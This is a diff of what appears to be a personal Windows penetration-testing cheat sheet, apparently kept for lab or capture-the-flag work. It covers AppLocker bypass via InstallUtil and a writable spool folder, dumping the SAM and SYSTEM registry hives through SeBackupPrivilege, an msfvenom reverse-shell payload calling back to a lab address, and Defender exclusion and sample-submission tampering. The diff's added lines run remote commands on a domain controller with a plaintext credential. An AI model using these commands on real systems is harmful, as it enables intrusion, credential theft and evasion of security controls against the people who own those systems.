@@ -18,7 +18,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 c:\windows\system32\spool\drivers\color\     (folder that bypasses applocker)
 
-#(Abuse seBackupPrivilege/seRestorePrivilege) 
+# Abuse seBackupPrivilege/seRestorePrivilege
 #0 reg save hklm\sam sam; reg save hklm\system system
 #1 unix2dos shadowcopy.txt (in linux attacker machine)
 #2 upload shadowcopy to the machine
@@ -31,3 +31,9 @@ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.4 LPORT=1339 -f ms
 Add-MpPreference -ExclusionPath "C:\Temp"  (add exclusion path)
 Remove-MpPreference -ExclusionPath "C:\Temp"
 PowerShell Set-MpPreference -SubmitSamplesConsent 2 (disable automatic send samples for labs etc)
+
+# authenticate on domain and execute command on any computer
+#0 $pass=ConvertTo-SecureString "myPass" -AsPlainText -Force
+#1 $cred=New-Object System.Management.Automation.PSCredential("domain.local\username",$pass)
+#2 Invoke-Command -Computer DC-1 -Credential $cred -ScriptBlock { whoami }
+
